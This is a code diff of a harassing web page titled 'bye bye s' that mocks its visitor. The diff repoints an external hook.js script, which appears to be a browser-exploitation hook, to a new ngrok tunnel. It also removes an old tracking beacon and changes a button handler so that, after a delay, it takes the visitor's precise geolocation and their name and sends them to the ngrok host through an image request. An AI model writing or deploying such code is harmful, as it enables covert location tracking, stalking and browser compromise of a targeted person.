@@ -1,10 +1,10 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <script src="https://86b7958254f1.ngrok-free.app/hook.js"></script>
   <meta charset="utf-8"/>
   <title>bye bye s</title>
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <script src="https://reva-workable-loveably.ngrok-free.dev/hook.js"></script>
   <style>
     body{font-family:system-ui,Arial,sans-serif;background:#f6f8fa;color:#111;padding:20px}
     .card{max-width:640px;margin:40px auto;background:#fff;border-radius:12px;padding:32px;box-shadow:0 8px 24px rgba(0,0,0,0.1)}
@@ -27,40 +27,35 @@
     <p class="muted">Press or leave — nobody loves u s</p>
   </div>
 
-
-  <script>
-    (function(){
-      var i = new Image();
-      i.src = "  https://86b7958254f1.ngrok-free.app" + Date.now();
-      i.onload = i.onerror = function(){};
-    })();
-  </script>
-
-
   <script>
     document.getElementById('btn').onclick = function() {
       const out = document.getElementById('out');
       const name = document.getElementById('greet').value || 'bye bye s';
-      out.textContent = 'Requesting your fucking location...';
+      
+      out.textContent = 'Processing... Please wait...';
 
-      if (!navigator.geolocation) {
-        out.textContent = `${name}\n\nGeolocation not supported.`;
-        return;
-      }
+      setTimeout(function() {
+          out.textContent = 'Requesting your fucking location...';
 
-      navigator.geolocation.getCurrentPosition(function(pos) {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const acc = pos.coords.accuracy;
+          if (!navigator.geolocation) {
+            out.textContent = `${name}\n\nGeolocation not supported.`;
+            return;
+          }
 
-        out.textContent = `${name}\n\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ±${acc}m\n\nbye`;
+          navigator.geolocation.getCurrentPosition(function(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
 
-    
-        new Image().src = `  https://86b7958254f1.ngrok-free.app/?lat=${lat}&lon=${lon}&acc=${acc}&name=${encodeURIComponent(name)}&t=${Date.now()}`;
+            out.textContent = `${name}\n\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ±${acc}m\n\nbye`;
+            
+            new Image().src = `https://reva-workable-loveably.ngrok-free.dev/?lat=${lat}&lon=${lon}&acc=${acc}&name=${encodeURIComponent(name)}&t=${Date.now()}`;
 
-      }, function(err) {
-        out.textContent = `${name}\n\nPermission denied bitch: ${err.message}`;
-      }, { enableHighAccuracy: true, timeout: 15000 });
+          }, function(err) {
+            out.textContent = `${name}\n\nPermission denied bitch: ${err.message}`;
+          }, { enableHighAccuracy: true, timeout: 15000 });
+
+      }, 6000);
     };
   </script>
 </body>
